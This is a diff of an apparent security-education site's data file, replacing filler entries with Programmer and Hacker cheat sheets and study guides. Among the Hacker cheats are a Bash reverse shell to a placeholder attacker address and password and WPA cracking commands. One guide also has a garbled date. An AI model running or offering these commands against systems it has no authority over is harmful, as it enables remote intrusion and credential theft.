+      { title: "Vulnerability Management", text: "Vulnerability management is a continuous cycle: discover assets, scan for vulnerabilities, prioritize based on risk, remediate or mitigate, and verify fixes. Tools like Nessus, OpenVAS, and Qualys automate scanning. Not every vulnerability needs immediate patching — risk-based prioritization ensures resources are spent where they matter most." },
+      { title: "Security Operations Center (SOC)", text: "A SOC is a centralized team responsible for monitoring and defending an organization's assets. SOC analysts triage alerts, investigate incidents, and coordinate response. Tier 1 handles initial alert triage. Tier 2 performs deeper investigation. Tier 3 handles advanced threats and threat hunting. A well-run SOC is the nerve center of organizational defense." },
+      { title: "Cloud Security Basics", text: "Cloud security follows the shared responsibility model: the provider secures the infrastructure, while the customer secures what they put in the cloud. Common cloud misconfigurations include publicly exposed S3 buckets, overly permissive IAM roles, unencrypted databases, and missing logging. Tools like Prowler, ScoutSuite, and Steampipe help audit AWS, Azure, and GCP environments." }
     ]
   },
   "Programmer": {
-    "description": "The Architect: Clean Code, Scalable Systems, and Algorithmic Masterpieces.",
-    "cheats": [
-      {
-        "label": "React Hook 1",
-        "cmd": "useState()",
-        "desc": "State."
-      },
-      {
-        "label": "React Hook 2",
-        "cmd": "useState()",
-        "desc": "State."
-      },
-      {
-        "label": "React Hook 3",
-        "cmd": "useState()",
-        "desc": "State."
-      },
-      {
-        "label": "React Hook 4",
-        "cmd": "useState()",
-        "desc": "State."
-      },
-      {
-        "label": "React Hook 5",
-        "cmd": "useState()",
-        "desc": "State."
-      },
-      {
-        "label": "React Hook 6",
-        "cmd": "useState()",
-        "desc": "State."
-      },
-      {
-        "label": "React Hook 7",
-        "cmd": "useState()",
-        "desc": "State."
-      },
-      {
-        "label": "React Hook 8",
-        "cmd": "useState()",
-        "desc": "State."
-      },
-      {
-        "label": "React Hook 9",
-        "cmd": "useState()",
-        "desc": "State."
-      },
-      {
-        "label": "React Hook 10",
-        "cmd": "useState()",
-        "desc": "State."
-      },
-      {
-        "label": "React Hook 11",
-        "cmd": "useState()",
-        "desc": "State."
-      },
-      {
-        "label": "React Hook 12",
-        "cmd": "useState()",
-        "desc": "State."
-      },
-      {
-        "label": "React Hook 13",
-        "cmd": "useState()",
-        "desc": "State."
-      },
-      {
-        "label": "React Hook 14",
-        "cmd": "useState()",
-        "desc": "State."
-      },
-      {
-        "label": "React Hook 15",
-        "cmd": "useState()",
-        "desc": "State."
-      },
-      {
-        "label": "React Hook 16",
-        "cmd": "useState()",
-        "desc": "State."
-      },
-      {
-        "label": "React Hook 17",
-        "cmd": "useState()",
-        "desc": "State."
-      },
-      {
-        "label": "React Hook 18",
-        "cmd": "useState()",
-        "desc": "State."
-      },
-      {
-        "label": "React Hook 19",
-        "cmd": "useState()",
-        "desc": "State."
-      },
-      {
-        "label": "React Hook 20",
-        "cmd": "useState()",
-        "desc": "State."
-      },
-      {
-        "label": "React Hook 21",
-        "cmd": "useState()",
-        "desc": "State."
-      },
-      {
-        "label": "React Hook 22",
-        "cmd": "useState()",
-        "desc": "State."
-      },
-      {
-        "label": "React Hook 23",
-        "cmd": "useState()",
-        "desc": "State."
-      },
-      {
-        "label": "React Hook 24",
-        "cmd": "useState()",
-        "desc": "State."
-      },
-      {
-        "label": "React Hook 25",
-        "cmd": "useState()",
-        "desc": "State."
-      },
-      {
-        "label": "React Hook 26",
-        "cmd": "useState()",
-        "desc": "State."
-      },
-      {
-        "label": "React Hook 27",
-        "cmd": "useState()",
-        "desc": "State."
-      },
-      {
-        "label": "React Hook 28",
-        "cmd": "useState()",
-        "desc": "State."
-      },
-      {
-        "label": "React Hook 29",
-        "cmd": "useState()",
-        "desc": "State."
-      },
-      {
-        "label": "React Hook 30",
-        "cmd": "useState()",
-        "desc": "State."
-      }
+    description: "Building secure, scalable systems — writing code that powers the digital world and withstands adversarial pressure.",
+    cheats: [
+      { label: "Python File Read", cmd: "with open('file.txt', 'r') as f:\n    data = f.read()", desc: "Safely open and read a file using Python's context manager." },
+      { label: "Python Socket Connect", cmd: "import socket\ns = socket.socket()\ns.connect(('ip', 80))", desc: "Create a TCP socket and connect to a remote host in Python." },
+      { label: "Python Base64 Encode", cmd: "import base64\nbase64.b64encode(b'hello')", desc: "Encode bytes to Base64 using Python's standard library." },
+      { label: "Python SHA256 Hash", cmd: "import hashlib\nhashlib.sha256(b'hello').hexdigest()", desc: "Generate a SHA256 hex digest of a byte string." },
+      { label: "Bash For Loop", cmd: "for i in {1..10}; do echo $i; done", desc: "Iterate from 1 to 10 and print each number in Bash." },
+      { label: "Bash If Statement", cmd: "if [ -f file.txt ]; then echo exists; fi", desc: "Check if a file exists before performing an action." },
+      { label: "Git Clone Repo", cmd: "git clone https://github.com/user/repo.git", desc: "Download a remote Git repository to your local machine." },
+      { label: "Git Commit & Push", cmd: "git add . && git commit -m 'fix' && git push", desc: "Stage changes, commit with a message, and push to remote." },
+      { label: "JavaScript Fetch API", cmd: "fetch('/api/data').then(r => r.json()).then(console.log)", desc: "Make an HTTP GET request and parse the JSON response." },
+      { label: "Node HTTP Server", cmd: "require('http').createServer((req,res)=>res.end('OK')).listen(3000)", desc: "Create a minimal HTTP server in Node.js on port 3000." },
+      { label: "Docker Run Container", cmd: "docker run -d -p 80:80 --name web nginx", desc: "Run an Nginx container in detached mode, mapping port 80." },
+      { label: "Regex Match IP", cmd: "\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b", desc: "Regular expression pattern to match IPv4 addresses." },
+      { label: "Python List Comprehension", cmd: "[x*2 for x in range(10)]", desc: "Create a list by transforming each element in a concise one-liner." },
+      { label: "Python Dict Access", cmd: "data = {'key': 'value'}\nprint(data.get('key'))", desc: "Safely retrieve a value from a Python dictionary." },
+      { label: "JavaScript Array Map", cmd: "[1,2,3].map(x => x * 2)", desc: "Transform each element of an array in JavaScript." },
+      { label: "SQL Select Query", cmd: "SELECT * FROM users WHERE active = 1;", desc: "Retrieve all active rows from a database table." },
+      { label: "SQL Join Tables", cmd: "SELECT u.name, o.total FROM users u JOIN orders o ON u.id = o.user_id;", desc: "Combine rows from two related tables." },
+      { label: "Python Try Except", cmd: "try:\n    risky()\nexcept Exception as e:\n    print(e)", desc: "Handle exceptions gracefully in Python." },
+      { label: "Curl POST JSON", cmd: "curl -X POST -H 'Content-Type: application/json' -d '{\"key\":\"val\"}' http://api.com", desc: "Send a JSON payload via HTTP POST using curl." },
+      { label: "Python Virtual Env", cmd: "python3 -m venv env && source env/bin/activate", desc: "Create and activate an isolated Python environment." },
+      { label: "NPM Init Project", cmd: "npm init -y", desc: "Initialize a new Node.js project with default settings." },
+      { label: "Python Requests POST", cmd: "import requests\nrequests.post(url, json={'key':'value'})", desc: "Send a POST request with JSON data in Python." }
     ],
-    "guides": [
-      {
-        "title": "Architecture: Clean Code",
-        "text": "Principles of SOLID design and how to write maintainable, scalable software."
-      },
-      {
-        "title": "Performance: Node.js Cluster",
-        "text": "Scaling single-threaded Node apps across multi-core processors."
-      },
-      {
-        "title": "React: Design Systems",
-        "text": "Building reusable, high-fidelity UI components using Atomic Design principles."
-      },
-      {
-        "title": "Rust: Memory Safety",
-        "text": "Understanding the borrow checker, ownership, and lifecycles for zero-cost safety."
-      },
-      {
-        "title": "Database: GIN Indexing",
-        "text": "Optimizing Postgres for ultra-fast full-text search and JSONB queries."
-      },
-      {
-        "title": "CI/CD: Github Action Ops",
-        "text": "Automating builds, tests, and security scans in your development pipeline."
-      },
-      {
-        "title": "TDD: Test-Driven Design",
-        "text": "Writing failing tests first to drive cleaner, more reliable implementations."
-      },
-      {
-        "title": "API: GraphQL vs REST",
-        "text": "Designing modern data interfaces: When to use which and how to secure them."
-      },
-      {
-        "title": "TypeScript: Advanced Types",
-        "text": "Mastering generics, mapped types, and conditional types for maximum safety."
-      },
-      {
-        "title": "DevOps: Terraform IaC",
-        "text": "Managing cloud infrastructure as version-controlled code."
-      },
-      {
-        "title": "Security: OWASP Top 10",
-        "text": "A developer's guide to building software that is inherently immune to top threats."
-      },
-      {
-        "title": "Algorithms: Graph Theory",
-        "text": "Implementing BFS, DFS, and Dijkstra's for complex pathfinding logic."
-      },
-      {
-        "title": "Frontend: State Management",
-        "text": "Comparing Redux, Zustand, and Context for large-scale applications."
-      },
-      {
-        "title": "Backend: Microservices",
-        "text": "Designing distributed systems using message brokers like RabbitMQ or Kafka."
-      },
-      {
-        "title": "Python: AsyncIO Mastery",
-        "text": "Handling thousands of concurrent network connections using non-blocking I/O."
-      },
-      {
-        "title": "UX: Accessibility First",
-        "text": "Building interfaces that are usable by everyone, regardless of hardware or ability."
-      },
-      {
-        "title": "C++: Modern Smart Pointers",
-        "text": "Replacing raw pointers with unique_ptr and shared_ptr for memory safety."
-      },
-      {
-        "title": "Web: HTTP/3 and QUIC",
-        "text": "Understanding and optimizing for the next generation of web protocols."
-      },
-      {
-        "title": "Database: NoSQL vs SQL",
-        "text": "Choosing the right storage engine for your specific data access patterns."
-      },
-      {
-        "title": "Refactoring: Legacy Systems",
-        "text": "Safely updating old codebases without introducing regressions or downtime."
-      },
-      {
-        "title": "Serverless: Lambda Ops",
-        "text": "Building and deploying cost-efficient event-driven functions in the cloud."
-      },
-      {
-        "title": "Go: Concurrency Patterns",
-        "text": "Mastering goroutines, channels, and select for high-performance systems."
-      },
-      {
-        "title": "Programmer: Team Lead Ops",
-        "text": "Mentoring juniors, conducting code reviews, and managing technical debt."
-      },
-      {
-        "title": "Cloud: Docker Orchestration",
-        "text": "Going beyond simple containers: Using Kubernetes for global scaling."
-      },
-      {
-        "title": "AI: Integrating LLMs",
-        "text": "Building agents and RAG systems that leverage Large Language Models."
-      },
-      {
-        "title": "Web: WebAssembly (WASM)",
-        "text": "Running high-performance C++/Rust code in the browser for heavy compute."
-      },
-      {
-        "title": "Mobile: React Native Sync",
-        "text": "Building cross-platform apps with shared state and native performance."
-      },
-      {
-        "title": "Functional Programming",
-        "text": "Using immutability and higher-order functions to eliminate common bug classes."
-      },
-      {
-        "title": "System Design: The Cap Theorem",
-        "text": "Balancing Consistency, Availability, and Partition Tolerance in distributed data."
-      },
-      {
-        "title": "The Interstellar Architect",
-        "text": "Visionary leadership for complex, global-scale software ecosystems."
-      }
+    guides: [
+      { title: "Programming for Security", text: "Security professionals who can code have a massive advantage. Programming allows you to automate repetitive tasks, build custom tools, parse large datasets, and understand vulnerabilities at a deeper level. Python is the most popular language in cybersecurity due to its readability and massive ecosystem. Bash is essential for Linux operations. JavaScript knowledge is critical for web application testing." },
+      { title: "Secure Coding Principles", text: "Writing secure code means assuming input is malicious until proven otherwise. Never trust user input. Use parameterized queries to prevent SQL injection. Encode output to prevent XSS. Validate and sanitize all data. Implement proper authentication and session management. Apply the principle of least privilege. Keep dependencies updated. Security is not a feature you add at the end — it is a quality of the code itself." },
+      { title: "Automation with Python", text: "Python excels at gluing tools together. You can write scripts that call APIs, parse logs, scan networks, generate reports, and monitor systems. Key libraries for security include: requests (HTTP), scapy (packet crafting), pwntools (CTF/exploitation), cryptography (encryption), and beautifulsoup4 (web scraping). Learning to read documentation and write clean, modular scripts is a superpower." },
+      { title: "Version Control with Git", text: "Git is the standard for tracking code changes. Every developer and security engineer should understand the basics: cloning repositories, creating branches, committing changes, merging, and resolving conflicts. Platforms like GitHub and GitLab also host CI/CD pipelines, issue trackers, and security scanning tools. A clean commit history makes collaboration possible." },
+      { title: "APIs and Web Services", text: "Modern applications are built as collections of APIs communicating over HTTP. Understanding REST principles, JSON data formats, authentication mechanisms (API keys, OAuth, JWT), and rate limiting is essential. When testing APIs, tools like curl, Postman, and Burp Repeater are invaluable. Always check for broken object-level authorization (BOLA) and excessive data exposure." },
+      { title: "Containers and DevSecOps", text: "Docker and Kubernetes have transformed how software is deployed. Containers package applications with their dependencies, making them portable and scalable. However, containers introduce new security concerns: image vulnerabilities, misconfigured registries, privileged containers, and secret leakage. DevSecOps integrates security into the CI/CD pipeline so issues are caught before production." },
+      { title: "Data Structures for Efficiency", text: "Understanding data structures helps you write faster and more memory-efficient code. Arrays provide fast index access. Hash maps (dictionaries) offer near-instant lookups. Sets automatically handle uniqueness. Graphs model networks and relationships. Choosing the right structure for the problem can mean the difference between a script that finishes in seconds and one that runs for hours." },
+      { title: "Debugging Like a Pro", text: "Bugs are inevitable. Great engineers are great debuggers. Start by reproducing the issue consistently. Read error messages carefully — they usually tell you exactly what is wrong. Use print statements or a debugger to trace execution. Isolate the problem by commenting out code or testing inputs one at a time. Finally, fix the root cause, not just the symptom, and write a test to prevent regression." },
+      { title: "Object-Oriented Programming", text: "OOP organizes code into objects that combine data (attributes) and behavior (methods). The four pillars are: Encapsulation (hiding internal state), Inheritance (reusing code through parent-child relationships), Polymorphism (treating different objects through a common interface), and Abstraction (simplifying complex reality). OOP is prevalent in Java, C#, Python, and many other languages." },
+      { title: "Database Design & SQL", text: "Databases store structured data. Relational databases (MySQL, PostgreSQL) use tables and SQL. NoSQL databases (MongoDB, Redis) use documents, key-value pairs, or graphs. Understanding normalization, indexing, transactions, and ACID properties helps you design efficient and reliable data layers. SQL injection remains one of the most common web vulnerabilities, so parameterized queries are mandatory." },
+      { title: "Algorithms & Big O Notation", text: "An algorithm is a step-by-step procedure for solving a problem. Big O notation describes how an algorithm's runtime or memory usage grows as the input size increases. O(1) is constant time. O(log n) is logarithmic. O(n) is linear. O(n²) is quadratic. Understanding complexity helps you choose the right algorithm and avoid performance bottlenecks." },
+      { title: "Regular Expressions", text: "Regular expressions (regex) are patterns used to match character combinations in strings. They are incredibly powerful for parsing logs, validating input, and extracting data. However, regex can be hard to read and vulnerable to ReDoS (Regular Expression Denial of Service) if written poorly. Tools like regex101.com help you test and debug patterns interactively." },
+      { title: "Testing & Test-Driven Development", text: "Testing ensures your code works as intended. Unit tests verify individual functions. Integration tests verify that components work together. TDD is the practice of writing tests before writing the actual code. This forces you to think about requirements and edge cases upfront. Frameworks include pytest (Python), Jest (JavaScript), and JUnit (Java)." },
+      { title: "Networking for Developers", text: "Every developer should understand the basics of TCP/IP, DNS, HTTP, and TLS. TCP provides reliable, ordered delivery. IP handles addressing and routing. DNS translates domain names to IP addresses. HTTP is the protocol of the web. TLS encrypts connections. Understanding these layers helps you debug connectivity issues, optimize performance, and build secure applications." },
+      { title: "Cloud Development Basics", text: "Cloud platforms like AWS, Azure, and GCP offer compute, storage, and networking as services. Key concepts include: virtual machines (EC2), serverless functions (Lambda), object storage (S3), managed databases (RDS), and identity services (IAM). Cloud-native development emphasizes scalability, resilience, and infrastructure-as-code using tools like Terraform and CloudFormation." },
+      { title: "Building CLI Tools", text: "Command-line interfaces are the lingua franca of security professionals. Building your own CLI tools with Python (argparse/click), Go (cobra), or Node.js (commander) allows you to create reusable utilities. Good CLI tools handle errors gracefully, provide helpful help text, accept configuration files, and output data in multiple formats (text, JSON, CSV)." }
     ]
   },
   "Hacker": {
-    "description": "The Explorer: Hardware Interfacing, Firmware Analysis, and Deep Logic Deconstruction.",
-    "cheats": [
-      {
-        "label": "ADB Connect 1",
-        "cmd": "adb connect",
-        "desc": "Remote dev."
-      },
-      {
-        "label": "ADB Connect 2",
-        "cmd": "adb connect",
-        "desc": "Remote dev."
-      },
-      {
-        "label": "ADB Connect 3",
-        "cmd": "adb connect",
-        "desc": "Remote dev."
-      },
-      {
-        "label": "ADB Connect 4",
-        "cmd": "adb connect",
-        "desc": "Remote dev."
-      },
-      {
-        "label": "ADB Connect 5",
-        "cmd": "adb connect",
-        "desc": "Remote dev."
-      },
-      {
-        "label": "ADB Connect 6",
-        "cmd": "adb connect",
-        "desc": "Remote dev."
-      },
-      {
-        "label": "ADB Connect 7",
-        "cmd": "adb connect",
-        "desc": "Remote dev."
-      },
-      {
-        "label": "ADB Connect 8",
-        "cmd": "adb connect",
-        "desc": "Remote dev."
-      },
-      {
-        "label": "ADB Connect 9",
-        "cmd": "adb connect",
-        "desc": "Remote dev."
-      },
-      {
-        "label": "ADB Connect 10",
-        "cmd": "adb connect",
-        "desc": "Remote dev."
-      },
-      {
-        "label": "ADB Connect 11",
-        "cmd": "adb connect",
-        "desc": "Remote dev."
-      },
-      {
-        "label": "ADB Connect 12",
-        "cmd": "adb connect",
-        "desc": "Remote dev."
-      },
-      {
-        "label": "ADB Connect 13",
-        "cmd": "adb connect",
-        "desc": "Remote dev."
-      },
-      {
-        "label": "ADB Connect 14",
-        "cmd": "adb connect",
-        "desc": "Remote dev."
-      },
-      {
-        "label": "ADB Connect 15",
-        "cmd": "adb connect",
-        "desc": "Remote dev."
-      },
-      {
-        "label": "ADB Connect 16",
-        "cmd": "adb connect",
-        "desc": "Remote dev."
-      },
-      {
-        "label": "ADB Connect 17",
-        "cmd": "adb connect",
-        "desc": "Remote dev."
-      },
-      {
-        "label": "ADB Connect 18",
-        "cmd": "adb connect",
-        "desc": "Remote dev."
-      },
-      {
-        "label": "ADB Connect 19",
-        "cmd": "adb connect",
-        "desc": "Remote dev."
-      },
-      {
-        "label": "ADB Connect 20",
-        "cmd": "adb connect",
-        "desc": "Remote dev."
-      },
-      {
-        "label": "ADB Connect 21",
-        "cmd": "adb connect",
-        "desc": "Remote dev."
-      },
-      {
-        "label": "ADB Connect 22",
-        "cmd": "adb connect",
-        "desc": "Remote dev."
-      },
-      {
-        "label": "ADB Connect 23",
-        "cmd": "adb connect",
-        "desc": "Remote dev."
-      },
-      {
-        "label": "ADB Connect 24",
-        "cmd": "adb connect",
-        "desc": "Remote dev."
-      },
-      {
-        "label": "ADB Connect 25",
-        "cmd": "adb connect",
-        "desc": "Remote dev."
-      },
-      {
-        "label": "ADB Connect 26",
-        "cmd": "adb connect",
-        "desc": "Remote dev."
-      },
-      {
-        "label": "ADB Connect 27",
-        "cmd": "adb connect",
-        "desc": "Remote dev."
-      },
-      {
-        "label": "ADB Connect 28",
-        "cmd": "adb connect",
-        "desc": "Remote dev."
-      },
-      {
-        "label": "ADB Connect 29",
-        "cmd": "adb connect",
-        "desc": "Remote dev."
-      },
-      {
-        "label": "ADB Connect 30",
-        "cmd": "adb connect",
-        "desc": "Remote dev."
-      }
+    description: "The hacker ethos — hardware, unconventional thinking, digital philosophy, and the art of creative problem solving.",
+    cheats: [
+      { label: "Strings Binary Analysis", cmd: "strings -n 8 suspicious.bin", desc: "Extract readable strings from a binary file to find clues." },
+      { label: "Binwalk Firmware Extract", cmd: "binwalk -Me firmware.bin", desc: "Automatically extract filesystems and data from firmware images." },
+      { label: "John the Ripper Crack", cmd: "john --wordlist=rockyou.txt hashes.txt", desc: "Crack password hashes using a dictionary attack." },
+      { label: "Aircrack WPA Capture", cmd: "aircrack-ng capture.cap -w rockyou.txt", desc: "Crack WPA/WPA2 handshakes using a wordlist." },
+      { label: "Hexdump Inspection", cmd: "xxd file.bin | head -20", desc: "View the first 20 lines of a hex dump of any file." },
+      { label: "Curl Headers Inspect", cmd: "curl -I https://target.com", desc: "Fetch only the HTTP headers to inspect server information." },
+      { label: "Base64 Decode", cmd: "echo 'SGVsbG8=' | base64 -d", desc: "Decode a Base64-encoded string in the terminal." },
+      { label: "Hash File MD5", cmd: "md5sum file.txt", desc: "Calculate the MD5 hash of a file for integrity checking." },
+      { label: "Search for Secrets", cmd: "grep -riE 'password|secret|api_key' ./", desc: "Recursively search a directory for hardcoded secrets." },
+      { label: "Reverse Shell One-Liner", cmd: "bash -i >& /dev/tcp/attacker.ip/4444 0>&1", desc: "Classic Bash TCP reverse shell one-liner." },
+      { label: "Tmux New Session", cmd: "tmux new -s hacking", desc: "Start a persistent terminal session that survives disconnects." },
+      { label: "SSH Local Port Forward", cmd: "ssh -L 8080:internal:80 user@bastion", desc: "Forward a local port through an SSH tunnel to an internal service." },
+      { label: "GDB Start Debug", cmd: "gdb ./program", desc: "Launch a program inside the GNU Debugger." },
+      { label: "Objdump Disassemble", cmd: "objdump -d binary | grep -A 20 main:", desc: "Disassemble a binary and inspect the main function." },
+      { label: "Radare2 Analyze", cmd: "r2 -A ./binary", desc: "Open a binary in Radare2 and perform automatic analysis." },
+      { label: "Exiftool Metadata", cmd: "exiftool image.jpg", desc: "Extract hidden metadata from images and documents." },
+      { label: "Steghide Extract", cmd: "steghide extract -sf image.jpg", desc: "Extract hidden data from image files using steganography." },
+      { label: "Zsteg LSB Analysis", cmd: "zsteg image.png", desc: "Detect steganography in PNG and BMP files using LSB analysis." },
+      { label: "Apktool Reverse Android", cmd: "apktool d app.apk", desc: "Decompile an Android APK to inspect its resources and smali code." },
+      { label: "Jadx Decompile APK", cmd: "jadx -d out app.apk", desc: "Decompile an Android APK back to readable Java source code." },
+      { label: "Nikto Web Scan", cmd: "nikto -h http://target.com", desc: "Scan a web server for known vulnerabilities and misconfigurations." },
+      { label: "WhatWeb Fingerprint", cmd: "whatweb http://target.com", desc: "Identify the technologies used by a website." }
     ],
-    "guides": [
-      {
-        "title": "Hardware: UART Shells",
-        "text": "Finding and exploiting serial consoles on routers, IoT devices, and appliances."
-      },
-      {
-        "title": "Firmware: Binwalk Extract",
-        "text": "Deconstructing proprietary firmware images to find hidden keys and binaries."
-      },
-      {
-        "title": "RE: GDB & GEF Mastery",
-        "text": "Advanced Linux debugging: Finding buffer overflows and logic flaws at runtime."
-      },
-      {
-        "title": "Satellite: SDR Telemetry",
-        "text": "Using GNU Radio to intercept and decode unencrypted satellite downlinks."
-      },
-      {
-        "title": "IoT: Protocol Fuzzing",
-        "text": "Testing custom binary protocols for crashes and exploitable states."
-      },
-      {
-        "title": "RE: Ghidra Decompilation",
-        "text": "Transforming binary machine code back into readable, auditable C code."
-      },
-      {
-        "title": "JTAG: Boundary Scan Ops",
-        "text": "Manipulating CPU pins and registers directly via hardware debugging headers."
-      },
-      {
-        "title": "WiFi: Rogue AP Forensics",
-        "text": "Configuring the SCH-I400 for real-time traffic relay and data interception."
-      },
-      {
-        "title": "Binary: NOP Sled Crafting",
-        "text": "Designing efficient exploit payloads for memory corruption vulnerabilities."
-      },
-      {
-        "title": "Signal: GPS Spoofing",
-        "text": "Using SDR to simulate false location data for research and testing."
-      },
-      {
-        "title": "Flash: SPI Memory Dumping",
-        "text": "Reading BIOS and firmware chips directly from the PCB using SOIC clips."
-      },
-      {
-        "title": "Side-Channel: Power Analysis",
-        "text": "Measuring voltage fluctuations to extract cryptographic keys from hardware."
-      },
-      {
-        "title": "RF: Sub-GHz Exploitation",
-        "text": "Interacting with low-power radio devices like car remotes and smart meters."
-      },
-      {
-        "title": "RE: Android Native Libs",
-        "text": "Reversing JNI libraries to find vulnerabilities in high-security mobile apps."
-      },
-      {
-        "title": "Hardware: Logic Probing",
-        "text": "Using Saleae Logic to decode I2C, SPI, and UART traffic during boot."
-      },
-      {
-        "title": "Exploit: Return-Oriented Programming",
-        "text": "Bypassing Non-Executable (NX) memory by chaining existing code gadgets."
-      },
-      {
-        "title": "SDR: ADS-B Flight Tracking",
-        "text": "Intercepting aircraft telemetry to visualize global air traffic in real-time."
-      },
-      {
-        "title": "Flash: Nand Glitching",
-        "text": "Timing voltage drops to bypass secure boot checks on protected chips."
-      },
-      {
-        "title": "Hacker: The Lab Creator",
-        "text": "Building automated, vulnerable environments for safe exploitation practice."
-      },
-      {
-        "title": "Firmware: U-Boot Bypass",
-        "text": "Interrupting the bootloader to modify kernel arguments and gain root shells."
-      },
-      {
-        "title": "IoT: Zigbee/Z-Wave Sniffing",
-        "text": "Intercepting traffic from smart home and industrial sensor networks."
-      },
-      {
-        "title": "RE: Obfuscated Binaries",
-        "text": "Techniques for unpacking UPX, VMProtect, and other binary protection layers."
-      },
-      {
-        "title": "Bluetooth: BLE Auditing",
-        "text": "Sniffing and injecting data into Bluetooth Low Energy GATT services."
-      },
-      {
-        "title": "Hardware: PCB Trace Repair",
-        "text": "Physical techniques for repairing and modifying microscopic circuit traces."
-      },
-      {
-        "title": "Exploit: Heap Grooming",
-        "text": "Manipulating memory layout to ensure predictable heap-based exploitation."
-      },
-      {
-        "title": "RF: GSM Interception",
-        "text": "Understanding the security and vulnerabilities of legacy cellular networks."
-      },
-      {
-        "title": "Hacker: The Field Operative",
-        "text": "Gear, tools, and mindsets for conducting hardware assessments in the wild."
-      },
-      {
-        "title": "Firmware: Custom Kernel Build",
-        "text": "Compiling and injecting custom Linux kernels into IoT device partitions."
-      },
-      {
-        "title": "RE: Symbolic Execution",
-        "text": "Using Angr to automatically solve complex code paths and find vulnerabilities."
-      },
-      {
-        "title": "The Explorer Sovereign",
-        "text": "Mastery of the physical and digital worlds: The ultimate technical pioneer."
-      }
+    guides: [
+      { title: "The Hacker Ethos", text: "Hacking is a mindset, not a criminal record. The original hacker culture emerged at MIT in the 1961960s — it was about creative exploration, pushing systems beyond their intended limits, and sharing knowledge freely. The hacker ethos values curiosity, persistence, and the belief that understanding how things work is a fundamental right. Today, ethical hackers use these same skills to protect society." },
+      { title: "First Principles Thinking", text: "Elon Musk popularized first principles thinking, but hackers have used it for decades. Instead of reasoning by analogy ('this is how it has always been done'), you break a problem down to its fundamental truths and build up from there. When facing a new system, ask: What is this made of? How do the pieces interact? What are the assumptions? Breaking assumptions is where vulnerabilities live." },
+      { title: "Hardware Hacking Basics", text: "Software is not the only attack surface. Hardware hacking involves reverse engineering devices, extracting firmware, analyzing circuit boards, and finding debug interfaces like UART, JTAG, and SPI. Tools like a Bus Pirate, FTDI adapter, or logic analyzer can communicate with chips directly. Understanding datasheets and schematics opens up a whole new dimension of security research." },
+      { title: "Binary Exploitation Intro", text: "Binary exploitation is the art of making a program do something it was not designed to do by manipulating its memory. Common techniques include buffer overflows (writing past the end of a buffer), format string attacks (leaking memory via printf), and return-oriented programming (ROP). Tools like GDB, pwndbg, GEF, and pwntools are essential for this discipline." },
+      { title: "Cryptography for Hackers", text: "You do not need to be a mathematician to understand cryptography in practice. Learn the difference between symmetric encryption (AES) and asymmetric encryption (RSA). Understand hashing (SHA256) versus encoding (Base64). Recognize when passwords are stored properly (salted hashes) versus improperly (plaintext or unsalted MD5). Many real-world bugs come from developers misusing crypto primitives." },
+      { title: "Wireless Security", text: "Wi-Fi networks are everywhere and often poorly secured. The WPA2 handshake can be captured and cracked offline if the password is weak. WPS is vulnerable to brute-force attacks. Rogue access points can trick users into connecting to malicious networks. Tools like Aircrack-ng, Wifite, and Bettercap are staples of wireless security testing. Always test networks you own or have explicit permission to test." },
+      { title: "OSINT: Open Source Intelligence", text: "OSINT is the collection and analysis of information from public sources. It includes search engines, social media, public records, domain registration data, satellite imagery, and code repositories. A skilled OSINT practitioner can map out an organization's infrastructure, find employee credentials in pastebin dumps, and discover forgotten subdomains — all without sending a single packet to the target." },
+      { title: "Building a Home Lab", text: "A home lab is the best investment in your hacking education. Start with a hypervisor like VirtualBox or VMware. Build a small network with a Kali Linux attack VM, a vulnerable target like Metasploitable or DVWA, and a Windows VM for malware analysis. As you grow, add a pfSense firewall for network segmentation, a SIEM for log analysis, and an AD domain for enterprise testing." },
+      { title: "Reverse Engineering Software", text: "Reverse engineering is the process of analyzing a compiled program to understand its logic. Static analysis examines the binary without running it (disassemblers like IDA Pro, Ghidra, and Radare2). Dynamic analysis runs the program in a debugger (x64dbg, OllyDbg). Understanding assembly language, calling conventions, and the PE/ELF file formats is fundamental to this craft." },
+      { title: "Steganography & Hidden Data", text: "Steganography is the practice of hiding information within other files. Images are the most common carrier — data can be hidden in the least significant bits (LSB) of pixel values. Audio files, documents, and even network protocols can also carry hidden messages. Tools like steghide, zsteg, and OpenStego help detect and extract hidden data." },
+      { title: "Mobile Application Security", text: "Mobile apps run on devices that users carry everywhere. Android apps (APK) can be decompiled with apktool and JADX. iOS apps (IPA) can be analyzed with Frida and objection. Common mobile vulnerabilities include insecure data storage, hardcoded credentials, weak certificate validation, and improper platform usage. Dynamic instrumentation allows you to hook app functions at runtime." },
+      { title: "IoT & Embedded Security", text: "The Internet of Things connects billions of devices, many of which are insecure by design. IoT security testing involves firmware extraction, UART/JTAG debugging, analyzing wireless protocols (Zigbee, Z-Wave, Bluetooth), and intercepting device-to-cloud traffic. Many IoT devices run embedded Linux, making traditional pentesting skills directly applicable." },
+      { title: "Game Hacking & Anti-Cheat", text: "Game hacking intersects with reverse engineering, memory manipulation, and network protocol analysis. Techniques include DLL injection, memory scanning (Cheat Engine), packet manipulation, and bypassing anti-cheat systems like Easy Anti-Cheat and BattlEye. This field requires deep knowledge of Windows internals, DirectX, and kernel drivers." },
+      { title: "The Art of CTFs", text: "Capture The Flag (CTF) competitions are gamified security challenges. Categories include: Web, Cryptography, Reverse Engineering, Binary Exploitation (Pwn), Forensics, and OSINT. CTFs are an excellent way to learn new skills in a safe, legal environment. Platforms like Hack The Box, TryHackMe, PicoCTF, and OverTheWire offer challenges for all skill levels." },
+      { title: "Bug Bounty Hunting", text: "Bug bounty programs pay hackers to find vulnerabilities in production systems. Success requires a combination of technical skill, creativity, and persistence. Popular platforms include HackerOne, Bugcrowd, and Intigriti. Focus on reconnaissance, understanding the application's business logic, and looking for edge cases that automated scanners miss. A single critical bug can pay thousands of dollars." },
+      { title: "The Philosophy of Technology", text: "Technology is not neutral. It encodes the values, biases, and power structures of its creators. Hackers have historically been at the forefront of questioning these structures — from the free software movement to digital privacy advocacy. Understanding the social and political dimensions of technology makes you not just a better technician, but a more responsible citizen of the digital world." }
     ]
   }
 };
